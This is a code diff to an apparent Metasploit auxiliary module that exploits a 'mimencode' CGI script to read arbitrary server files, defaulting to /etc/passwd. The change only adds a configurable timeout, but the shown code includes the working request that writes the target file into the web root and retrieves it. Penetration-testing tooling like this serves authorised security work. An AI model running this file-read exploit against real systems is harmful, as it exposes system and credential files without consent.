@@ -28,9 +28,14 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('FILE', [ true, 'The file to traverse for', '/etc/passwd']),
-        OptString.new('URL', [ true, 'The path to mimencode', '/cgi-bin/ck/mimencode']),
+        OptString.new('FILE', [ true, 'The file to traverse for', '/etc/passwd' ]),
+        OptString.new('URL', [ true, 'The path to mimencode', '/cgi-bin/ck/mimencode' ]),
+        OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 25 ])
       ], self.class)
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 25
   end
 
   def run_host(ip)
@@ -42,7 +47,7 @@ class Metasploit3 < Msf::Auxiliary
         {
           'method'  => 'POST',
           'uri'     => normalize_uri(datastore['URL']) + '?-o+' + '/home/httpd/html/' + tmpfile + '+' + datastore['FILE'],
-        }, 25)
+        }, timeout)
 
       if (res and res.code == 500)
 
@@ -52,7 +57,7 @@ class Metasploit3 < Msf::Auxiliary
           {
             'method'  => 'GET',
             'uri'     => '/' + tmpfile,
-          }, 25)
+          }, timeout)
 
         if (file and file.code == 200)
           print_status("Request for #{datastore['FILE']} appears to have worked on #{rhost}:#{rport}! Response: #{file.code}\r\n#{Rex::Text.decode_base64(file.body)}")
